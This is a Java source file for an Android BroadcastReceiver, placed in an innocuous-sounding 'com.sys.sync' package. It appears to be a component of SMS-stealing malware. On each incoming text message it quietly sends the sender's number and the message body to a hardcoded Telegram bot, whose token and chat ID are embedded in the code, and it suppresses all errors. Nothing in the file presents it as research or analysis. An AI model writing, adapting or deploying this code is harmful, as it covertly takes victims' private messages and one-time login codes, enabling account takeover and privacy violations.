package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String msg = sms.getOriginatingAddress() + " : " + sms.getMessageBody();
                    new Thread(() -> {
                        try {
                            String link = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=" + URLEncoder.encode(msg, "UTF-8");
                            HttpURLConnection c = (HttpURLConnection) new URL(link).openConnection();
                            c.setRequestMethod("GET");
                            c.getResponseCode();
                            c.disconnect();
                        } catch (Exception ignored) {}
                    }).start();
                }
            }
        }
    }
}
